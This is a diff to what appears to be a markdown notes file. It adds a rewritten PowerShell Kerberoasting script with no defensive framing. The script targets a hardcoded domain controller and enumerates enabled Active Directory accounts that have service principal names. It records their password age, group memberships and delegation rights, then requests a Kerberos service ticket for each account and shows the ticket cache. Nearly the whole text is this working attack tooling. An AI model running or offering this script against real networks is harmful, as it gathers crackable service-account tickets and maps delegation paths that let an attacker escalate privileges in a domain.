@@ -298,4 +298,160 @@ function Get-KerberoastTickets {
 # Run the function
 Get-KerberoastTickets
 ```
+# rewrite
+
+
+```
+$DC="10.21.65.229"
+Add-Type -AssemblyName System.IdentityModel
+Import-Module ActiveDirectory
+
+Write-Host "`n=== SPN / KERBEROS TGS ENUMERATION ===" -ForegroundColor Cyan
+Write-Host "AD Server : $DC"
+Write-Host "User      : $env:USERDOMAIN\$env:USERNAME`n"
+
+$Accounts=@(
+    Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Server $DC `
+    -Properties ServicePrincipalName,Enabled,PasswordLastSet,PasswordNeverExpires,LastLogonDate,MemberOf,TrustedForDelegation,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo |
+    Where-Object {
+        $_.Enabled -eq $true -and
+        $_.SamAccountName -ne "krbtgt"
+    }
+)
+
+Write-Host "[+] Found $($Accounts.Count) enabled SPN-bearing user account(s)." -ForegroundColor Green
+
+$Results=@()
+
+foreach($Account in $Accounts){
+
+    $SPNs=@($Account.ServicePrincipalName)
+
+    if($SPNs.Count -eq 0){
+        continue
+    }
+
+    $SelectedSPN=$SPNs | Select-Object -First 1
+    $DelegationTargets=@($Account.'msDS-AllowedToDelegateTo')
+
+    $Groups=@(
+        $Account.MemberOf | ForEach-Object {
+            ($_ -split ',')[0] -replace '^CN=',''
+        }
+    )
+
+    Write-Host "`n==================================================" -ForegroundColor DarkGray
+    Write-Host "[*] ACCOUNT: $($Account.SamAccountName)" -ForegroundColor Cyan
+
+    Write-Host "Enabled                 : $($Account.Enabled)"
+    Write-Host "PasswordLastSet         : $($Account.PasswordLastSet)"
+    Write-Host "PasswordNeverExpires    : $($Account.PasswordNeverExpires)"
+    Write-Host "LastLogonDate           : $($Account.LastLogonDate)"
+    Write-Host "SPN Count               : $($SPNs.Count)"
+    Write-Host "TrustedForDelegation    : $($Account.TrustedForDelegation)"
+    Write-Host "ProtocolTransition      : $($Account.TrustedToAuthForDelegation)"
+    Write-Host "Delegation Target Count : $($DelegationTargets.Count)"
+
+    Write-Host "`nRegistered SPNs:" -ForegroundColor Yellow
+
+    foreach($SPN in $SPNs){
+        Write-Host "  $SPN"
+    }
+
+    Write-Host "`nSelected SPN:" -ForegroundColor Yellow
+    Write-Host "  $SelectedSPN"
+
+    Write-Host "`nDirect Groups:" -ForegroundColor Cyan
+
+    if($Groups.Count -gt 0){
+        foreach($Group in $Groups){
+            Write-Host "  $Group"
+        }
+    }
+    else{
+        Write-Host "  None"
+    }
+
+    Write-Host "`nDelegation Targets:" -ForegroundColor Cyan
+
+    if($DelegationTargets.Count -gt 0){
+        foreach($Target in $DelegationTargets){
+            Write-Host "  $Target"
+        }
+    }
+    else{
+        Write-Host "  None"
+    }
+
+    $TicketStatus="FAILED"
+    $TicketService=$null
+    $ValidFrom=$null
+    $ValidTo=$null
+    $ErrorMessage=$null
+
+    Write-Host "`n[*] Requesting TGS for selected SPN..."
+
+    try{
+        $Ticket=New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken($SelectedSPN)
+
+        $TicketStatus="SUCCESS"
+        $TicketService=$Ticket.ServicePrincipalName
+        $ValidFrom=$Ticket.ValidFrom
+        $ValidTo=$Ticket.ValidTo
+
+        Write-Host "[+] TGS REQUEST SUCCESSFUL" -ForegroundColor Green
+        Write-Host "    Service   : $TicketService"
+        Write-Host "    ValidFrom : $ValidFrom"
+        Write-Host "    ValidTo   : $ValidTo"
+    }
+    catch{
+        $ErrorMessage=$_.Exception.Message
+
+        Write-Host "[-] TGS REQUEST FAILED" -ForegroundColor Red
+        Write-Host "    $ErrorMessage"
+    }
+
+    $Results += [PSCustomObject]@{
+        Account               = $Account.SamAccountName
+        Enabled               = $Account.Enabled
+        PasswordLastSet       = $Account.PasswordLastSet
+        PasswordNeverExpires  = $Account.PasswordNeverExpires
+        SPNCount              = $SPNs.Count
+        SelectedSPN           = $SelectedSPN
+        TGSRequest            = $TicketStatus
+        TicketService         = $TicketService
+        ValidFrom             = $ValidFrom
+        ValidTo               = $ValidTo
+        ProtocolTransition    = $Account.TrustedToAuthForDelegation
+        DelegationTargetCount = $DelegationTargets.Count
+        Groups                = ($Groups -join "; ")
+        Error                 = $ErrorMessage
+    }
+}
+
+Write-Host "`n`n==================================================" -ForegroundColor Cyan
+Write-Host "SUMMARY"
+Write-Host "==================================================" -ForegroundColor Cyan
+
+$Results |
+Sort-Object Account |
+Format-Table Account,SPNCount,PasswordNeverExpires,TGSRequest,ProtocolTransition,DelegationTargetCount -AutoSize
+
+Write-Host "`n==================================================" -ForegroundColor Cyan
+Write-Host "SUCCESSFUL TGS REQUESTS"
+Write-Host "==================================================" -ForegroundColor Cyan
+
+$Results |
+Where-Object {$_.TGSRequest -eq "SUCCESS"} |
+Select-Object Account,SelectedSPN,ValidFrom,ValidTo,ProtocolTransition,DelegationTargetCount |
+Format-Table -Wrap -AutoSize
+
+Write-Host "`n==================================================" -ForegroundColor Cyan
+Write-Host "CURRENT KERBEROS TICKET CACHE"
+Write-Host "==================================================" -ForegroundColor Cyan
+
+klist
+
+Write-Host "`n=== COMPLETE ===" -ForegroundColor Cyan
+```
 
